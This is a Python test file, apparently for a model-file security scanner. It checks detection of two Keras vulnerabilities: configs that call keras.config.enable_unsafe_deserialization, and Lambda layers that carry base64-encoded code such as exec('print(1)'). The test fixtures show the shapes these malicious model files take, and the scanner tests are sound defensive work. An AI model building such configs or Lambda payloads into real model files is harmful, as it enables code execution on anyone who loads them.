    def test_cve_attribution_details(self, tmp_path: Path) -> None:
        """CVE details should be present in issue details."""
        scanner = KerasZipScanner()
        config_str = json.dumps(
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "Dense",
                            "name": "d",
                            "module": "keras.config",
                            "config": {"fn": "enable_unsafe_deserialization"},
                        }
                    ]
                },
            }
        )
        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) >= 1
        details = cve_issues[0].details
        assert details["cve_id"] == "CVE-2025-9906"
        assert details["cwe"] == "CWE-502"
        assert details["cvss"] == 8.6
        assert details["description"]
        assert details["config_path"] == "config.json"
        assert details["matched_symbol"] == "enable_unsafe_deserialization"
        assert details["detection_method"] in {"structured_config_scan", "raw_config_scan"}

    def test_plain_text_mention_without_keras_context_not_flagged(self, tmp_path: Path) -> None:
        """A plain text mention should not trigger when no keras.config context exists."""
        scanner = KerasZipScanner()
        config_str = json.dumps(
            {
                "class_name": "Model",
                "config": {
                    "layers": [],
                    "notes": "This doc mentions enable_unsafe_deserialization for awareness only",
                },
            }
        )
        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 0

    def test_cross_object_tokens_do_not_trigger_false_positive(self, tmp_path: Path) -> None:
        """Separate context/token in different objects should not trigger CVE."""
        scanner = KerasZipScanner()
        config_str = json.dumps(
            {
                "class_name": "Model",
                "config": {
                    "layers": [
                        {"class_name": "Dense", "name": "d1", "config": {"fn": "enable_unsafe_deserialization"}},
                        {"class_name": "Dense", "name": "d2", "module": "keras.config", "config": {"units": 16}},
                    ],
                },
            }
        )
        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 0, "Cross-object token co-occurrence should not trigger CVE-2025-9906"

    def test_comment_token_does_not_suppress_malicious_detection(self, tmp_path: Path) -> None:
        """Embedding a single comment token should not suppress CVE detection."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "d",
                        "module": "keras.config",
                        "config": {"fn": "enable_unsafe_deserialization", "notes": "#"},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) >= 1

    def test_documentation_text_with_bare_config_words_stays_documentation(self) -> None:
        """Bare prose mentions of config/module should not stop doc-like scoring."""
        text = "\n".join(
            [
                "This model config includes safe defaults and explanatory guidance only",
                "The module description here is narrative text for documentation readers",
                "Another long descriptive line for awareness and onboarding context",
            ]
        )

        assert KerasZipScanner._is_primarily_documentation_text(text) is True

    def test_dangerous_line_does_not_count_toward_documentation_ratio(self) -> None:
        """Dangerous literals must not inflate the documentation ratio."""
        text = "\n".join(
            [
                "This line is harmless documentation padding only",
                "This warning mentions keras.config.enable_unsafe_deserialization as prose only",
            ]
        )

        assert KerasZipScanner._is_primarily_documentation_text(text) is False

    def test_malformed_json_with_executable_raw_reference_is_detected(self, tmp_path: Path) -> None:
        """Malformed JSON should still trigger raw fallback when executable keys are present."""
        scanner = KerasZipScanner()
        config_str = (
            '{"class_name":"Sequential","config":{"module":"keras.config","fn":"enable_unsafe_deserialization",}'
        )

        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 1
        assert cve_issues[0].details["detection_method"] == "raw_config_scan"
        parse_checks = [c for c in result.checks if c.name == "Config JSON Parsing"]
        assert len(parse_checks) == 1
        assert parse_checks[0].status != CheckStatus.PASSED
        assert result.success is False

    def test_malformed_json_doc_symbol_without_executable_context_not_flagged(self, tmp_path: Path) -> None:
        """Malformed JSON documentation mentions alone must not trigger the raw fallback."""
        scanner = KerasZipScanner()
        config_str = (
            '{"description":"This documentation mentions '
            'keras.config.enable_unsafe_deserialization for awareness only",'
        )

        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 0

    def test_malformed_json_split_object_context_not_flagged(self, tmp_path: Path) -> None:
        """Module and function keys in different objects must not combine into a raw finding."""
        scanner = KerasZipScanner()
        config_str = '{"layers":[{"module":"keras.config"},{"fn":"enable_unsafe_deserialization"}],'

        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 0

    def test_invalid_utf8_config_bytes_still_trigger_raw_fallback(self, tmp_path: Path) -> None:
        """Invalid UTF-8 should still use the raw fallback instead of bypassing detection."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "invalid_utf8.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", b'{"loader":"keras.config.enable_unsafe_deserialization",\xff')
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.13.2"}))

        result = scanner.scan(str(keras_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 1
        assert cve_issues[0].details["detection_method"] == "raw_config_scan"
        parse_checks = [c for c in result.checks if c.name == "Config JSON Parsing"]
        assert len(parse_checks) == 1
        assert parse_checks[0].status != CheckStatus.PASSED
        assert result.success is False

    def test_benign_documentation_text_stays_clean(self, tmp_path: Path) -> None:
        """Benign long-form documentation text should not trigger CVE checks."""
        scanner = KerasZipScanner()
        config_str = json.dumps(
            {
                "class_name": "Model",
                "config": {
                    "notes": (
                        "This documentation example mentions keras.config.enable_unsafe_deserialization "
                        "for awareness only\n"
                        "Another long descriptive line for awareness and guidance\n"
                        "Helpful prose about model metadata and no executable content"
                    ),
                    "description": "Documentation for awareness and onboarding only",
                },
            }
        )

        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 0

    def test_description_text_without_dangerous_tokens_not_flagged(self, tmp_path: Path) -> None:
        """Config descriptions should remain clean when dangerous symbols are absent."""
        scanner = KerasZipScanner()
        config_str = json.dumps(
            {
                "class_name": "Sequential",
                "description": (
                    "This model config includes many words to document architecture choices\n"
                    "Padding text for readability and transparency without any dangerous references"
                ),
                "config": {"layers": [{"class_name": "Dense", "config": {"units": 4}}]},
            }
        )

        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 0


class TestCVE20243660LambdaAttribution:
    """Test CVE-2024-3660: Lambda layer code injection attribution."""

    def _make_keras_zip(self, config: dict[str, Any], tmp_path: Path, keras_version: str = "2.10.0") -> str:
        return _build_test_keras_zip(config, tmp_path, keras_version)

    def test_lambda_layer_has_cve_2024_3660_attribution(self, tmp_path: Path) -> None:
        """Lambda layer in .keras file should include CVE-2024-3660 attribution."""
        scanner = KerasZipScanner()
        encoded = base64.b64encode(b"lambda x: x * 2").decode()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "my_lambda",
                        "config": {"function": [encoded, None, None]},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if "CVE-2024-3660" in i.message]
        assert len(cve_issues) >= 1, "Lambda should have CVE-2024-3660 attribution"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["cve_id"] == "CVE-2024-3660"
        assert cve_issues[0].details["cvss"] == 9.8
        assert cve_issues[0].details["cwe"] == "CWE-94"
        assert cve_issues[0].details["description"]
        assert cve_issues[0].details["remediation"]
        assert cve_issues[0].details["layer_name"] == "my_lambda"

    def test_redacted_local_version_still_triggers_cve_2024_3660(self, tmp_path: Path) -> None:
        """Display redaction must not downgrade a valid vulnerable local version."""
        raw_secret = "sk-proj-CAND061ZIPVERSIONSECRET000000000000"
        encoded = base64.b64encode(b"lambda x: x * 2").decode()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "redacted_version_lambda",
                        "config": {"function": [encoded, None, None]},
                    }
                ]
            },
        }

        result = KerasZipScanner().scan(self._make_keras_zip(config, tmp_path, keras_version=f"2.12.0+{raw_secret}"))
        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2024-3660"]

        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["keras_version"] == "2.12.0+<redacted>"
        assert raw_secret not in result.to_json()

    @pytest.mark.parametrize(
        "layer_class",
        [
            "keras.layers.Lambda",
            "tf_keras.src.layers.core.lambda_layer.Lambda",
        ],
    )
    def test_fully_qualified_lambda_layer_has_cve_2024_3660_attribution(self, tmp_path: Path, layer_class: str) -> None:
        """Keras-qualified Lambda class names should use Lambda-specific ZIP checks."""
        scanner = KerasZipScanner()
        encoded = base64.b64encode(b"exec('print(1)')").decode()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": layer_class,
                        "name": "qualified_lambda",
                        "config": {"function": [encoded, None, None]},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2024-3660"]
        dangerous_lambda = [check for check in result.checks if check.name == "Lambda Layer Code Analysis"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert len(dangerous_lambda) == 1
        assert dangerous_lambda[0].details["layer_name"] == "qualified_lambda"

    def test_custom_namespace_lambda_layer_not_attributed_to_keras_zip_cve(self, tmp_path: Path) -> None:
        """Custom classes ending in Lambda should not be treated as Keras Lambda."""
        scanner = KerasZipScanner()
        encoded = base64.b64encode(b"exec('print(1)')").decode()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "myproject.layers.Lambda",
                        "name": "custom_lambda",
                        "config": {"function": [encoded, None, None]},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2024-3660"]
        dangerous_lambda = [check for check in result.checks if check.name == "Lambda Layer Code Analysis"]
        custom_layer_checks = [
            check
            for check in result.checks
            if check.name == "Custom Layer Class Detection"
            and check.details.get("layer_class") == "myproject.layers.Lambda"
        ]
        assert cve_issues == []
        assert dangerous_lambda == []
        assert len(custom_layer_checks) == 1

    def test_no_cve_without_lambda(self, tmp_path: Path) -> None:
        """Non-Lambda model should NOT have CVE-2024-3660 attribution."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": {"units": 10}}]},
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if "CVE-2024-3660" in i.message]
        assert len(cve_issues) == 0

    def test_no_cve_for_fixed_keras_version(self, tmp_path: Path) -> None:
        """Lambda in fixed Keras version should not be CVE-attributed."""
        scanner = KerasZipScanner()
        encoded = base64.b64encode(b"lambda x: x * 2").decode()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "my_lambda",
                        "config": {"function": [encoded, None, None]},
                    }
                ]
            },
        }
        keras_path = tmp_path / "model_fixed.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))
            zf.writestr("metadata.json", json.dumps({"keras_version": "2.13.0"}))

        result = scanner.scan(str(keras_path))
        cve_issues = [i for i in result.issues if "CVE-2024-3660" in i.message]
        assert len(cve_issues) == 0

    @pytest.mark.parametrize(
        "keras_version",
        [
            "2.13.0rc1",
            "2.13.0rc.post",
            "2.13.0rc1.post1",
            "2.13.0rc1.post.dev",
            "2.13.0rc1+cpu",
            "2.13.0a0",
            "2.13.0b1",
            "2.13.0.dev0",
            "2.13.0-rc1",
            "2.13.0pre1",
        ],
    )
    def test_cve_for_keras_213_prerelease_versions(self, tmp_path: Path, keras_version: str) -> None:
        """Prereleases of the CVE-2024-3660 fixed Keras version should remain vulnerable."""
        scanner = KerasZipScanner()
        encoded = base64.b64encode(b"lambda x: x * 2").decode()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "my_lambda",
                        "config": {"function": [encoded, None, None]},
                    }
                ]
            },
        }
        keras_path = self._make_keras_zip(config, tmp_path, keras_version=keras_version)

        result = scanner.scan(keras_path)
        audit_result = scan_model_directory_or_file(keras_path, config={"cache_scan_results": False})

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2024-3660"]
        passed_version_checks = [check for check in result.checks if check.name == "Lambda Version Risk Check"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["keras_version"] == keras_version
        assert passed_version_checks == []
        assert determine_exit_code(audit_result) == 1

    @pytest.mark.parametrize(
        "keras_version",
        [
            "2.13.0+cpu",
            "2.13.0+cpu.cuda_1",
            "2.13.0.post1",
            "2.13.0post1",
            "2.13.0.post",
            "2.13.0rev",
            "2.13.0-r",
            "2.13.0.post.dev",
            "2.13.0-1",
            "2.13.0.post1.dev0",
            "2.13.1",
            "2.13.1rc1",
            "2.13.1.dev0",
        ],
    )
    def test_no_cve_for_stable_keras_213_variants(self, tmp_path: Path, keras_version: str) -> None:
        """Stable fixed Keras 2.13 variants should stay outside CVE-2024-3660 attribution."""
        scanner = KerasZipScanner()
        encoded = base64.b64encode(b"lambda x: x * 2").decode()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "my_lambda",
                        "config": {"function": [encoded, None, None]},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path, keras_version=keras_version))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2024-3660"]
        assert cve_issues == []

    @pytest.mark.parametrize(
        "keras_version",
        [
            "2.13.0cpu",
            "2.13.0candidate",
            "2.13.0rc1.evil",
            "2.13.0rc1+cpu+cuda",
            "2.13.0--rc1",
            "2.13.0postevil",
            "2.13.0.postevil",
            "2.13.0+",
            "2.13.0+cpu+cuda",
            "2.13.1garbage",
            "keras-2.13.0",
        ],
    )
    def test_noncanonical_keras_213_versions_warn_instead_of_pass(self, tmp_path: Path, keras_version: str) -> None:
        """Unrecognized fixed-boundary qualifiers must not suppress Lambda risk with a passing check."""
        scanner = KerasZipScanner()
        encoded = base64.b64encode(b"lambda x: x * 2").decode()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "my_lambda",
                        "config": {"function": [encoded, None, None]},
                    }
                ]
            },
        }
        keras_path = self._make_keras_zip(config, tmp_path, keras_version=keras_version)

        result = scanner.scan(keras_path)
        audit_result = scan_model_directory_or_file(keras_path, config={"cache_scan_results": False})

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2024-3660"]
        passed_version_checks = [check for check in result.checks if check.name == "Lambda Version Risk Check"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.WARNING
        assert cve_issues[0].details["keras_version"] == keras_version
        assert cve_issues[0].details["parse_status"] == "unknown"
        assert passed_version_checks == []
        assert determine_exit_code(audit_result) == 1

    def test_cve_for_two_part_keras_version(self, tmp_path: Path) -> None:
        """Lambda in Keras 2.10 (two-part version) should be CVE-attributed."""
        scanner = KerasZipScanner()
        encoded = base64.b64encode(b"lambda x: x * 2").decode()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "my_lambda",
                        "config": {"function": [encoded, None, None]},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path, keras_version="2.10"))
        cve_issues = [i for i in result.issues if "CVE-2024-3660" in i.message]
        assert len(cve_issues) >= 1, "Keras 2.10 should be attributed as vulnerable"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL


class TestKerasZipScannerSubclassed:
    """Tests for subclassed model detection in ZIP format."""

    def test_allows_known_safe_model_classes_in_zip(self, tmp_path):
        """Test that scanner passes for known safe model classes."""
        from modelaudit.scanners.base import CheckStatus

        scanner = KerasZipScanner()

        for model_class in ["Sequential", "Functional", "Model"]:
            keras_path = tmp_path / f"model_{model_class}.keras"

            with zipfile.ZipFile(keras_path, "w") as zf:
                config = {
                    "class_name": model_class,
                    "config": {
                        "name": "test_model",
                        "layers": [
                            {"class_name": "Dense", "config": {"units": 10}},
                        ],
                    },
                }
                zf.writestr("config.json", json.dumps(config))
                zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))

            result = scanner.scan(str(keras_path))

            subclass_issues = [i for i in result.issues if "subclassed" in i.message.lower()]
            assert len(subclass_issues) == 0, f"{model_class} should not be flagged as subclassed"

            subclass_checks = [c for c in result.checks if "subclassed" in c.name.lower()]
            assert len(subclass_checks) > 0
            assert all(c.status == CheckStatus.PASSED for c in subclass_checks)
